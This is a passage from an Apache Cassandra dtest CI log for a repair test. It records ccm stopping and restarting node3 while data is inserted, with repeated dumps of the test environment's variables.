'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf'}
10:15:03 08:15:03,469 ccm INFO node3: using Java 8 for the current invocation
10:15:03 08:15:03,469 ccm INFO node3: using Java 8 for the current invocation
10:15:03 08:15:03,608 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:03 08:15:03,608 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:03 08:15:03,609 ccm INFO node3: using Java 8 for the current invocation
10:15:03 08:15:03,609 ccm INFO node3: using Java 8 for the current invocation
10:15:03 08:15:03,708 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:03 08:15:03,708 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:03 08:15:21,381 repair_tests.repair_test DEBUG stopping node3
10:15:21 08:15:35,487 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.3:9042 datacenter1> discovered
10:15:35 08:15:35,488 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.2:9042 datacenter1> discovered
10:15:35 08:15:35,546 repair_tests.repair_test DEBUG inserting data while node3 is down
10:15:35 08:15:45,907 repair_tests.repair_test DEBUG bring back node3
10:15:45 08:15:46,28 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf'}
10:15:46 08:15:46,28 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf'}
10:15:46 08:15:46,28 ccm INFO node3: using Java 8 for the current invocation
10:15:46 08:15:46,28 ccm INFO node3: using Java 8 for the current invocation
10:15:46 08:15:46,148 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:46 08:15:46,148 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': 